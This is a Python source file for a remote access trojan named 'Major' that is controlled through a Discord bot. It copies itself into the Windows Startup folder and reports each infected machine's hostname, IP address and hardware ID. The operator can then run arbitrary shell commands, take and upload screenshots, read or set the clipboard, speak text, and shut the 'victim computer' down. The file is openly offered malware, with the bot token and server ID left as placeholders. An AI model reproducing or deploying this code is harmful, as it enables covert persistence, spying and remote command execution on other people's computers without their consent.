import os

autostartup = True

def isinstartup():
    startup = os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup'
    if os.path.isfile(startup):
        return True
    else:
        return False

if autostartup:
    startup = os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup'
    if os.getcwd() == startup:
        pass
    else:
        try:
            import sys
        except:
            os.system('pip install sys')
            import sys
        try:
            import shutil
        except:
            os.system('pip install shutil')
            import shutil
        script_path = (sys.argv[0])
        shutil.copy(f'./{script_path}', startup)
    
try:
    import time
except:
    os.system('pip install time')
    import time

try:
    import discord
    from discord.ext import commands
except:
    os.system('pip install discord')
    import discord
    from discord.ext import commands

try:
    from dislash import *
except:
    os.system('pip install dislash.py')
    from dislash import *

try:
    import subprocess
except:
    os.system('pip install subprocess')
    import subprocess

try:
    import requests
except:
    os.system('pip install requests')
    import requests
    
try:
    import threading
except:
    os.system('pip install threading')
    import threading

try:
    from datetime import datetime
except:
    os.system('pip install datetime')
    from datetime import datetime

bot = commands.Bot(command_prefix="0x66726565")
inter_client = InteractionClient(bot)

def get_id():
    try:
        return  str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    except:
        return 'Failed to find HWID'

def get_hostname():
    try:
        return os.getenv('HOSTNAME', os.getenv('COMPUTERNAME')).split('.')[0]
    except:
        return 'Failed to find HOSTNAME'

def get_ip():
    try:
        return requests.get('https://api64.ipify.org?format=text').text
    except:
        return 'Failed to find IPV4'

def mariosound():
    try:

        try:
            from winsound import Beep
        except:
            os.system('pip install winsound')
            from winsound import Beep
        Beep(659, 125)
        Beep(659, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.167)
        Beep(523, 125)
        Beep(659, 125)
        time.sleep(0.125)
        Beep(784, 125)
        time.sleep(0.375)
        Beep(392, 125)
        time.sleep(0.375)
        Beep(523, 125)
        time.sleep(0.250)
        Beep(392, 125)
        time.sleep(0.250)
        Beep(330, 125)
        time.sleep(0.250)
        Beep(440, 125)
        time.sleep(0.125)
        Beep(494, 125)
        time.sleep(0.125)
        Beep(466, 125)
        time.sleep(0.42)
        Beep(440, 125)
        time.sleep(0.125)
        Beep(392, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.125)
        Beep(784, 125)
        time.sleep(0.125)
        Beep(880, 125)
        time.sleep(0.125)
        Beep(698, 125)
        Beep(784, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.125)
        Beep(523, 125)
        time.sleep(0.125)
        Beep(587, 125)
        Beep(494, 125)
        time.sleep(0.125)
        Beep(523, 125)
        time.sleep(0.250)
        Beep(392, 125)
        time.sleep(0.250)
        Beep(330, 125)
        time.sleep(0.250)
        Beep(440, 125)
        time.sleep(0.125)
        Beep(494, 125)
        time.sleep(0.125)
        Beep(466, 125)
        time.sleep(0.42)
        Beep(440, 125)
        time.sleep(0.125)
        Beep(392, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.125)
        Beep(784, 125)
        time.sleep(0.125)
        Beep(880, 125)
        time.sleep(0.125)
        Beep(698, 125)
        Beep(784, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.125)
        Beep(523, 125)
        time.sleep(0.125)
        Beep(587, 125)
        Beep(494, 125)
        time.sleep(0.375)
        Beep(784, 125)
        Beep(740, 125)
        Beep(698, 125)
        time.sleep(0.42)
        Beep(622, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.167)
        Beep(415, 125)
        Beep(440, 125)
        Beep(523, 125)
        time.sleep(0.125)
        Beep(440, 125)
        Beep(523, 125)
        Beep(587, 125)
        time.sleep(0.250)
        Beep(784, 125)
        Beep(740, 125)
        Beep(698, 125)
        time.sleep(0.42)
        Beep(622, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.167)
        Beep(698, 125)
        time.sleep(0.125)
        Beep(698, 125)
        Beep(698, 125)
        time.sleep(0.625)
        Beep(784, 125)
        Beep(740, 125)
        Beep(698, 125)
        time.sleep(0.42)
        Beep(622, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.167)
        Beep(415, 125)
        Beep(440, 125)
        Beep(523, 125)
        time.sleep(0.125)
        Beep(440, 125)
        Beep(523, 125)
        Beep(587, 125)
        time.sleep(0.250)
        Beep(622, 125)
        time.sleep(0.250)
        Beep(587, 125)
        time.sleep(0.250)
        Beep(523, 125)
        time.sleep(0.1125)
        Beep(784, 125)
        Beep(740, 125)
        Beep(698, 125)
        time.sleep(0.42)
        Beep(622, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.167)
        Beep(415, 125)
        Beep(440, 125)
        Beep(523, 125)
        time.sleep(0.125)
        Beep(440, 125)
        Beep(523, 125)
        Beep(587, 125)
        time.sleep(0.250)
        Beep(784, 125)
        Beep(740, 125)
        Beep(698, 125)
        time.sleep(0.42)
        Beep(622, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.167)
        Beep(698, 125)
        time.sleep(0.125)
        Beep(698, 125)
        Beep(698, 125)
        time.sleep(0.625)
        Beep(784, 125)
        Beep(740, 125)
        Beep(698, 125)
        time.sleep(0.42)
        Beep(622, 125)
        time.sleep(0.125)
        Beep(659, 125)
        time.sleep(0.167)
        Beep(415, 125)
        Beep(440, 125)
        Beep(523, 125)
        time.sleep(0.125)
        Beep(440, 125)
        Beep(523, 125)
        Beep(587, 125)
        time.sleep(0.250)
        Beep(622, 125)
        time.sleep(0.250)
        Beep(587, 125)
        time.sleep(0.250)
        Beep(523, 125)
    except:
        pass

def gangnamstyle():
    try:

        try:
            import winsound
        except:
            os.system('pip install winsound')
            import winsound
        winsound.Beep(293, 200) 
        winsound.Beep(293, 200) 
        winsound.Beep(293, 200) 
        winsound.Beep(293, 600) 
        winsound.Beep(246, 600) 
        time.sleep(0.1)
        winsound.Beep(369, 200)
        winsound.Beep(369, 200)
        winsound.Beep(369, 200)
        winsound.Beep(369, 600)
        winsound.Beep(329, 600) 
        time.sleep(0.1)
        winsound.Beep(329, 200) 
        winsound.Beep(329, 200) 
        winsound.Beep(329, 200) 
        winsound.Beep(369, 500) 
        time.sleep(0.9)
        winsound.Beep(369, 200) 
        winsound.Beep(369, 200) 
        winsound.Beep(369, 200) 
        winsound.Beep(369, 600) 
        time.sleep(0.9)
        winsound.Beep(369, 200) 
        winsound.Beep(369, 200) 
        winsound.Beep(369, 200) 
        for i in range(4):
            winsound.Beep(369, 200) 
            time.sleep(0.1)
        for i in range(4):
            winsound.Beep(369, 100) 
            time.sleep(0.1)
        winsound.Beep(369, 600) 
    except:
        pass
    

async def mainui(channel, msg):
    try:
        buttons = ActionRow(
            Button(
                style=ButtonStyle.blurple,
                label="Actions",
                custom_id="commands"
            ),
            Button(
                style=ButtonStyle.red,
                label="Remove",
                custom_id="remove"
            )
        )

        embed=discord.Embed(title="⚔ | Major", description="`[+] A new zombie has been infected !`", color=0x303135)
        embed.add_field(name="♡ | Hostname", value=f"||`{str(get_hostname())}`||", inline=True)
        embed.add_field(name="♡ | IPV4", value=f"||`{str(get_ip())}`||", inline=True)
        embed.add_field(name="♡ | Datetime", value=f"||`{str(datetime.date(datetime.now()))}`||", inline=True)
        embed.add_field(name="♡ | HWID", value=f"||`{str(get_id())}`||", inline=True)
        await msg.edit(content="", embed=embed, components=[buttons])

        inter = await msg.wait_for_button_click(check)
        return inter
    except:
        buttons = ActionRow(
            Button(
                style=ButtonStyle.green,
                label="Ok",
                custom_id="ok"
            )
        )
        embed=discord.Embed(title="Major | Error", description=" Major encountered an error !", color=0x303135)
        msg = await inter.reply(embed=embed, components=[buttons])
        inter = await msg.wait_for_button_click(check)
        button_text = inter.clicked_button.id
        if button_text == "ok":
            await msg.delete()



@bot.event
async def on_ready():
    try:
        chaname =  get_hostname().lower().replace(" ", "-")
        guild = bot.get_guild(free)
        for channel in guild.channels:
            if str(chaname) in channel.name:
                await channel.delete()
        cat = discord.utils.get(guild.categories, id=free)
        channel = await guild.create_text_channel(str(chaname), category=cat)
        mainmsg = await channel.send('Major Is Loading...')
        while True:

            inter = await mainui(channel, mainmsg)
            
            if inter.clicked_button.id == "remove":

                buttons = ActionRow(
                    Button(
                        style=ButtonStyle.red,
                        label="✔",
                        custom_id="yes"
                    ),
                    Button(
                        style=ButtonStyle.green,
                        label="❌",
                        custom_id="no"
                    )
                )

                embed=discord.Embed(title=f"Major | Delete : {str(get_hostname())}", description="Are you sure you want to delete this machine ? > you can't restore it after !", color=0x303135)
                msg = await inter.reply(embed=embed, components=[buttons])
                inter = await msg.wait_for_button_click(check)
                button_text = inter.clicked_button.id

                if button_text == "yes":
                    startup = os.getenv('appdata')+'\Microsoft\Windows\Start Menu\Programs\Startup\WindowsTasksManager.pyw'
                    try:
                        os.remove(startup)
                    except:
                        pass
                    try:
                        await channel.delete()
                        await bot.logout()
                        os.system('cls')
                        exit()
                    except:
                        os.system('cls')
                        pass
                else:
                    await msg.delete()
                    pass

            elif inter.clicked_button.id == "commands":

                menu = SelectMenu(
                    custom_id="actions",
                    placeholder="❓",
                    max_values=1,
                    options=[
                        SelectOption("Shutdown", "shutdown"),
                        SelectOption("Shell", "shell"),
                        SelectOption("Check", "check"),
                        SelectOption("Screenshot", "screenshot"),
                        SelectOption("Voice", "voice"),
                        SelectOption("Clipboard", "clipboard"),
                        SelectOption("Copy", "copy"),
                        SelectOption("Windows Beep Mario Music", "mariomusic"),
                        SelectOption("Windows Beep Gangnam-Style Music", "gangnammusic"),
                        SelectOption("Cancel", "cancel")
                    ]
                )

                embed=discord.Embed(title="Major | Actions", description="What action you want to execute to the victim computer ", color=0x303135)
                commandmsg = await inter.reply(embed=embed, components=[menu])

                inter = await commandmsg.wait_for_dropdown(check)
                customid = [option.value for option in inter.select_menu.selected_options][0]
                
                if customid == "gangnammusic":
                    buttons = ActionRow(
                        Button(
                            style=ButtonStyle.green,
                            label="Ok",
                            custom_id="ok"
                        )
                    )
                    threading.Thread(target=gangnamstyle).start()
                    embed=discord.Embed(title="Major | Gangnam-Style Music", description=f"The Gangnam-Style music has been started !")
                    msg = await inter.reply(embed=embed, components=[buttons])
                    inter = await msg.wait_for_button_click(check)
                    button_text = inter.clicked_button.id
                    if button_text == "ok":
                        await msg.delete()
                        await commandmsg.delete()

                if customid == "mariomusic":
                    buttons = ActionRow(
                        Button(
                            style=ButtonStyle.green,
                            label="Ok",
                            custom_id="ok"
                        )
                    )
                    threading.Thread(target=mariosound).start()
                    embed=discord.Embed(title="Major | Mario Music", description=f"The mario music has been started !")
                    msg = await inter.reply(embed=embed, components=[buttons])
                    inter = await msg.wait_for_button_click(check)
                    button_text = inter.clicked_button.id
                    if button_text == "ok":
                        await msg.delete()
                        await commandmsg.delete()

                if customid == "copy":
                    try:
                        import pyperclip
                    except:
                        os.system('pip install pyperclip')
                        import pyperclip
                    buttons = ActionRow(
                        Button(
                            style=ButtonStyle.green,
                            label="Ok",
                            custom_id="ok"
                        )
                    )

                    embed=discord.Embed(title="Major | Copy", description="please send the text you want to copy from victim computer in the chat", color=0x303135)
                    msg = await inter.reply(embed=embed)
                    tts = await bot.wait_for("message")
                    await tts.delete()
                    pyperclip.copy(tts.content)
                    embed=discord.Embed(title="Major | Clipboard", description=f"The text has been copied to clipboard !")
                    await msg.edit(embed=embed, components=[buttons])
                    inter = await msg.wait_for_button_click(check)
                    button_text = inter.clicked_button.id
                    if button_text == "ok":
                        await msg.delete()
                        await commandmsg.delete()

                if customid == "clipboard":
                    try:
                        import pyperclip
                    except:
                        os.system('pip install pyperclip')
                        import pyperclip
                    s = pyperclip.paste()
                    buttons = ActionRow(
                        Button(
                            style=ButtonStyle.green,
                            label="Ok",
                            custom_id="ok"
                        )
                    )
                    embed=discord.Embed(title="Major | Clipboard", description=f"There is the victim clipboard : `{s}`")
                    msg = await inter.reply(embed=embed, components=[buttons])
                    inter = await msg.wait_for_button_click(check)
                    button_text = inter.clicked_button.id
                    if button_text == "ok":
                        await msg.delete()
                        await commandmsg.delete()

                if customid == "voice":
                    try:
                        import pyttsx3
                    except:
                        os.system('pip install pyttsx3')
                        import pyttsx3

                    buttons = ActionRow(
                        Button(
                            style=ButtonStyle.green,
                            label="Ok",
                            custom_id="ok"
                        )
                    )
                    embed=discord.Embed(title="Major | Voice", description="please send the text you want to speech from the victim computer in the chat", color=0x303135)
                    msg = await inter.reply(embed=embed)
                    tts = await bot.wait_for("message")
                    await tts.delete()
                    engine = pyttsx3.init()
                    engine.say(tts.content)
                    engine.runAndWait()
                    embed=discord.Embed(title="Major | Voice", description="The TTS has been speech !", color=0x303135)
                    await msg.edit(embed=embed, components=[buttons])
                    inter = await msg.wait_for_button_click(check)
                    button_text = inter.clicked_button.id
                    if button_text == "ok":
                        await msg.delete()
                        await commandmsg.delete()

                if customid == "cancel":
                    await commandmsg.delete()

                if customid == "check":
                    buttons = ActionRow(
                        Button(
                            style=ButtonStyle.green,
                            label="Ok",
                            custom_id="ok"
                        )
                    )

                    embed=discord.Embed(title="Major | Check", description="Yes, Im always running on the victim computer !", color=0x303135)
                    embed.add_field(name="Path:", value=f"`{str(os.path.abspath(__file__))}`", inline=False)
                    if isinstartup() == True:
                        isstartup = "✅"
                    else:
                        isstartup = "❌"
                    embed.add_field(name="Startup:", value=f"{isstartup}", inline=False)
                    msg = await inter.reply(embed=embed, components=[buttons])
                    inter = await msg.wait_for_button_click(check)
                    button_text = inter.clicked_button.id
                    await msg.delete()
                    await commandmsg.delete()

                elif customid == "shutdown":
                    buttons = ActionRow(
                        Button(
                            style=ButtonStyle.green,
                            label="Ok",
                            custom_id="ok"
                        ),
                        Button(
                            style=ButtonStyle.red,
                            label="Cancel",
                            custom_id="cancel"
                        )
                    )
                    embed=discord.Embed(title="Major | Shutdown", description="The computer will be shutdowned in few minutes !", color=0x303135)
                    shutdownmsg = await inter.reply(embed=embed, components=[buttons])
                    os.system('shutdown /s')
                    inter = await shutdownmsg.wait_for_button_click(check)
                    button_text = inter.clicked_button.id
                    if button_text == "ok":
                        await msg.delete()
                        await commandmsg.delete()
                    elif button_text == "cancel":

                        buttons = ActionRow(
                            Button(
                                style=ButtonStyle.green,
                                label="Ok",
                                custom_id="ok"
                            )
                        )
                        os.system('shutdown -a')
                        embed=discord.Embed(title="Major | Shutdown Canceled", description="The shutdown has been canceled!", color=0x303135)
                        msg = await inter.reply(embed=embed, components=[buttons])
                        inter = await msg.wait_for_button_click(check)
                        button_text = inter.clicked_button.id
                        if button_text == "ok":
                            await msg.delete()
                            await shutdownmsg.delete()
                            await commandmsg.delete()


                elif customid == "shell":

                    buttons = ActionRow(
                        Button(
                            style=ButtonStyle.green,
                            label="Ok",
                            custom_id="ok"
                        )
                    )
                    embed=discord.Embed(title="Major | Shell", description="You can type every shell command in the chat and its will be executed on the victim computer !", color=0x303135)
                    shellmsg = await inter.reply(embed=embed)
                    cmd = await bot.wait_for("message")
                    await cmd.delete()
                    subprocess_ = subprocess.Popen(cmd.content, shell=True, stdout=subprocess.PIPE)
                    subprocess_return = subprocess_.stdout.read()
                    embed=discord.Embed(title="Major | Shell", description=f"Command Executed ! Output : `{str(subprocess_return.decode('ascii'))}`", color=0x303135)
                    msg = await inter.reply(embed=embed, components=[buttons])
                    inter = await msg.wait_for_button_click(check)
                    button_text = inter.clicked_button.id
                    if button_text == "ok":
                        await shellmsg.delete()
                        await msg.delete()
                        await commandmsg.delete()

                elif customid == "screenshot":
                    try:
                        import pyautogui
                    except:
                        os.system('pip install pyautogui')
                        import pyautogui

                    buttons = ActionRow(
                        Button(
                            style=ButtonStyle.green,
                            label="Ok",
                            custom_id="ok"
                        )
                    )

                    pyautogui.screenshot("./screen.png")
                    embed=discord.Embed(title="Major | Screenshot", description="There is the victim screen :", color=0x303135)
                    msg = await inter.reply(embed=embed)
                    screenmsg = await channel.send(file=discord.File("./screen.png"), components=[buttons])
                    os.system('del screen.png')
                    inter = await screenmsg.wait_for_button_click(check)
                    button_text = inter.clicked_button.id
                    if button_text == "ok":
                        await screenmsg.delete()
                        await msg.delete()
                        await commandmsg.delete()
    
    except:
        buttons = ActionRow(
            Button(
                style=ButtonStyle.green,
                label="Ok",
                custom_id="ok"
            )
        )
        embed=discord.Embed(title="Major | Error", description=" Major encountered an error !", color=0x303135)
        msg = await inter.reply(embed=embed, components=[buttons])
        inter = await msg.wait_for_button_click(check)
        button_text = inter.clicked_button.id
        if button_text == "ok":
            await msg.delete()



try:
    bot.run("YOUR BOT TOKEN")
except:
    os.system('cls')
    time.sleep(200)
